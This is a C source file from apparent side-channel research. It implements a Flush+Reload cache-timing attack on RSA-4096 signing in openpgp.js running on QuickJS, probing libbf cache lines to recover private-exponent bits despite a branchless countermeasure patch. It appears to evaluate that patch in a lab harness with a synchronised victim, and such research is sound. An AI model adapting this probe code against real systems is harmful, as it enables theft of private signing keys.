/* Flush+Reload cache attack against the branchless `selectBigInt` patch, as
 * used inside a *real* RSA-4096 BigInteger.modExp loop (js/openpgp_select_rsa.js
 * signs via crypto.publicKey.rsa.sign against a copy of openpgp.js with
 * `r = lsb ? rx : r` replaced by `r = SELECT(lsb, rx, r, bits)`), rather than
 * the synthetic per-round SELECT()-call harness in ../openpgp_patch/quickjs_select_fr.c.
 *
 * Targets the same cache line inside libbf's bf_add_internal (libbf.c ~949,
 * the bf_resize call on the full-arithmetic path only reached when the
 * secret bit is 1) as quickjs_select_fr.c; see that file's header comment and
 * ../openpgp_patch/INTEL_PT_LOCALIZATION.md for how the target line was
 * originally localized and how its file offset is re-derived per-build.
 *
 * Unlike quickjs_select_fr.c (which alternates a fixed COND for a whole
 * round of many SELECT() calls), this attacker probes *continuously* across
 * one entire real signing call, since real exponent bits vary across the
 * signature's private exponent d. Bit-boundary reconstruction (turning the
 * continuous hit trace into a per-bit sequence) is done offline by
 * evaluation/extract_select_rsa.py's windowed hit-count decoder, not here.
 *
 * CONFOUND FOUND AND WORKED AROUND: bf_add_internal is the single shared
 * limb-addition implementation used by every BigInt add/sub in the library
 * (confirmed via objdump: bf_add_internal has exactly two callers, __bf_add
 * and __bf_sub, both tail-jumps into the same code), including the internal
 * subtraction steps of bf_mul/bf_divrem (i.e. the (r*x)%n and (x*x)%n work
 * every modExp iteration does *regardless* of the secret bit). A pure
 * bf_add_internal hit-count probe (see openpgp_patch_rsa/PROGRESS.md) cannot
 * separate SELECT's cond-dependent subtraction from that unconditional
 * background traffic, and measured at chance accuracy (~50%).
 *
 * Fix: add a second probe channel on bf_logic_or's cache line. bf_logic_or
 * has exactly ONE caller in the whole library: js_binary_arith_bigint's
 * OP_or case (quickjs.c:13297) -- i.e. it fires if and only if a real BigInt
 * `|` executes, which only SELECT's own `(...) | (...)` does (bf_mul/bf_divrem
 * never perform bitwise OR). So bf_logic_or hits are an exclusive per-SELECT-
 * call marker/clock, and bf_add_internal hits that land in a short cycle
 * window immediately before a bf_logic_or hit (SELECT computes its two
 * subtractions before combining with `|`) are very likely SELECT's own,
 * while the much larger population of add_internal hits scattered across the
 * rest of the (much longer) mul/mod-dominated iteration are not. See
 * evaluation/extract_select_rsa.py's windowed_inference for the correlation
 * logic that exploits this.
 */
#include "arch.h"
#include "cache.h"
#include "config.h"
#include "log.h"
#include "prime_probe.h"
#include "quickjs_runtime.h"
#include "quickjs/quickjs-libc.h"
#include "flush_reload.h"
#include "shared_memory.h"

#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <x86intrin.h>

enum { cache_line_count = 2, profile_iterations = 1 << 22 };
static uint64_t victim_runs = 20; /* repeated signing rounds, same KEY_ID */
static uint64_t key_id = 0;       /* single key for this first integration pass */

/* A full RSA-4096 modExp call is ~4096 loop iterations, far more than
 * quickjs_select_fr.c's 50-call synthetic batch; this budget must cover an
 * entire crypto.publicKey.rsa.sign() call. TBD hardware-timing constant,
 * expect to need tuning; override via ROUND_CYCLES. */
static uint64_t max_exec_cycles = (uint64_t)6e9;
static const char *test_name = "quickjs_select_rsa_fr";

/* Reload-latency cutoff (cycles) below which a probe counts as a cache hit. */
static const uint64_t hit_threshold = 300;

static uint64_t waiting_time = 2000;

static uint64_t reload_time_arr[cache_line_count][profile_iterations];
static uint64_t sample_tsc_arr[cache_line_count][profile_iterations];
static uint64_t *sample_tsc[cache_line_count];
static uint64_t *reload_time[cache_line_count];

uintptr_t target_bf_add;
uintptr_t target_bf_logic_or;

/* File offset of the divergent instruction inside bf_add_internal (the
 * bf_resize call beginning the full-arithmetic path, libbf.c:~949), as found
 * via `nm`/`addr2line` against this project's build/quickjs/lib/quickjs/libquickjs.so.
 * Must match ../openpgp_patch/quickjs_select_fr.c's constant of the same name;
 * recompute (see that file) if the QuickJS/libbf source or build flags change. */
static const uintptr_t bf_add_internal_full_path_file_offset = 0xb0065;

/* File offset of bf_logic_or (its own small tail-jump stub, not the shared
 * bf_logic_op body), found via `nm` against this build's libquickjs.so.
 * Exclusive marker: bf_logic_or has exactly one caller in the whole binary
 * (js_binary_arith_bigint's OP_or case), so a hit here can only be SELECT's
 * own `|`. Recompute (nm "$LIB" | grep bf_logic_or) if the build changes. */
static const uintptr_t bf_logic_or_file_offset = 0xb1220;

/* js_std_eval_file is an exported symbol we can take the address of
 * directly; its file offset (from `nm`) gives us the shared object's load
 * bias, from which we can reach the non-exported bf_add_internal/bf_logic_or. */
static const uintptr_t js_std_eval_file_offset = 0x18da0;

static void get_bf_add_internal_target() {
	uintptr_t load_bias =
	    (uintptr_t)&js_std_eval_file - js_std_eval_file_offset;
	target_bf_add =
	    (load_bias + bf_add_internal_full_path_file_offset) & CACHE_LINE_MASK;
	target_bf_logic_or =
	    (load_bias + bf_logic_or_file_offset) & CACHE_LINE_MASK;
	log_info("libquickjs.so load bias: %lx, target bf_add_internal "
	         "(full-path) cache line: %lx, target bf_logic_or cache line: %lx",
	         load_bias,
	         target_bf_add,
	         target_bf_logic_or);
}

static void FF_profile_select_rsa() {
	for (int i = 0; i < cache_line_count; ++i) {
		sample_tsc[i] = sample_tsc_arr[i];
		reload_time[i] = reload_time_arr[i];
	}

	init_sync_ctx(QUICKJS_PROJ_ID);
	pthread_barrier_wait(sync_ctx.barrier); /* matches victim's (A) */

	for (uint64_t i = 0; i < victim_runs; ++i) {
		/* quickjs_eval_buf_loop passes sync_ctx.data through a single
		 * putenv() call, matching openpgp_rsa.js's existing KEY_ID
		 * mechanism. Fixed key for this first integration pass. */
		snprintf((char *)sync_ctx.data, sync_ctx_data_size, "KEY_ID=%lu",
		          (unsigned long)key_id);

		sync_ctx_set_action(SYNC_CTX_START);
		/* matches victim's (B) [i==0] or (D) [i>0] */
		pthread_barrier_wait(sync_ctx.barrier);

		int index = 0;
		uint64_t tsc0 = rdtscp();
		while (index < profile_iterations &&
		       rdtscp() - tsc0 < max_exec_cycles) {
			FLUSH_CACHE_LINE(bf_add, 0);
			FLUSH_CACHE_LINE(bf_logic_or, 0);
			FR_wait(waiting_time);
			RELOAD_CACHE_LINE(bf_add, 0, 0);
			RELOAD_CACHE_LINE(bf_logic_or, 0, 1);
			++index;
			/* Real signing finishes well before max_exec_cycles; stop as
			 * soon as the victim pauses instead of probing (and diluting
			 * the trace with) idle time for the rest of the budget. Check
			 * periodically, not every iteration, to avoid the syscall-ish
			 * cost of sync_ctx_get_action() dominating the probe loop. */
			if ((index & 0xfff) == 0 &&
			    sync_ctx_get_action() == SYNC_CTX_PAUSE) {
				break;
			}
		}

		if (sync_ctx_get_action() != SYNC_CTX_PAUSE) {
			log_warn("Round %lu: profiling time/iteration not enough (index=%d)",
			         (unsigned long)i,
			         index);
		}
		/* matches victim's (C), releases it to (D) */
		pthread_barrier_wait(sync_ctx.barrier);

		uint64_t hits = 0, marker_hits = 0;
		for (int j = 0; j < index; ++j) {
			if (reload_time_arr[0][j] > 0 && reload_time_arr[0][j] < hit_threshold) {
				++hits;
			}
			if (reload_time_arr[1][j] > 0 && reload_time_arr[1][j] < hit_threshold) {
				++marker_hits;
			}
		}
		log_info("Round %lu: key_id=%lu samples=%d bf_add_hits=%lu (%.2f%%) "
		         "bf_logic_or_hits=%lu (%.2f%%)",
		         (unsigned long)i,
		         (unsigned long)key_id,
		         index,
		         hits,
		         index > 0 ? 100.0 * hits / index : 0.0,
		         marker_hits,
		         index > 0 ? 100.0 * marker_hits / index : 0.0);

		/* key-pool-style naming (test_name/test_name_key%05d), even though
		 * this first pass only exercises one key, to keep the trace layout
		 * extensible to a real key sweep later. */
		char test_key_name[256];
		snprintf(test_key_name, sizeof(test_key_name), "%s/%s_key%05lu",
		         test_name, test_name, (unsigned long)key_id);

		dump_profiling_traces(test_key_name,
		                      victim_runs,
		                      sample_tsc,
		                      reload_time,
		                      cache_line_count,
		                      index,
		                      i == 0);

		memset(sample_tsc_arr, 0, sizeof(sample_tsc_arr));
		memset(reload_time_arr, 0, sizeof(reload_time_arr));
	}

	sync_ctx_set_action(SYNC_CTX_EXIT);
	pthread_barrier_wait(sync_ctx.barrier);
}

int main(int argc, char **argv) {
	quickjs_get_bytecode_handler_cacheline();
	get_bf_add_internal_target();

	const char *env_victim_runs = getenv("VICTIM_RUNS");
	if (env_victim_runs != NULL) {
		char *endptr;
		errno = 0;
		uint64_t value = strtoull(env_victim_runs, &endptr, 10);
		if (errno == 0 && endptr != env_victim_runs && *endptr == '\0') {
			victim_runs = value;
		}
	}

	const char *env_key_id = getenv("KEY_ID");
	if (env_key_id != NULL) {
		char *endptr;
		errno = 0;
		uint64_t value = strtoull(env_key_id, &endptr, 10);
		if (errno == 0 && endptr != env_key_id && *endptr == '\0') {
			key_id = value;
		}
	}

	const char *env_round_cycles = getenv("ROUND_CYCLES");
	if (env_round_cycles != NULL) {
		char *endptr;
		errno = 0;
		uint64_t value = strtoull(env_round_cycles, &endptr, 10);
		if (errno == 0 && endptr != env_round_cycles && *endptr == '\0') {
			max_exec_cycles = value;
		}
	}

	const char *env_waiting_time = getenv("WAITING_TIME");
	if (env_waiting_time != NULL) {
		char *endptr;
		errno = 0;
		uint64_t value = strtoull(env_waiting_time, &endptr, 10);
		if (errno == 0 && endptr != env_waiting_time && *endptr == '\0') {
			waiting_time = value;
		}
	}

	if (argc > 1) {
		char *endptr;
		errno = 0;
		uint64_t value = strtoull(argv[1], &endptr, 10);
		if (errno == 0 && endptr != argv[1] && *endptr == '\0' && value > 0) {
			victim_runs = value;
		} else {
			log_error("Invalid victim_runs argument '%s'", argv[1]);
			return -1;
		}
	}

	log_info("Config: victim_runs=%lu, key_id=%lu, waiting_time=%lu, "
	         "max_exec_cycles=%lu",
	         (unsigned long)victim_runs,
	         (unsigned long)key_id,
	         (unsigned long)waiting_time,
	         (unsigned long)max_exec_cycles);

	FF_profile_select_rsa();
	return 0;
}
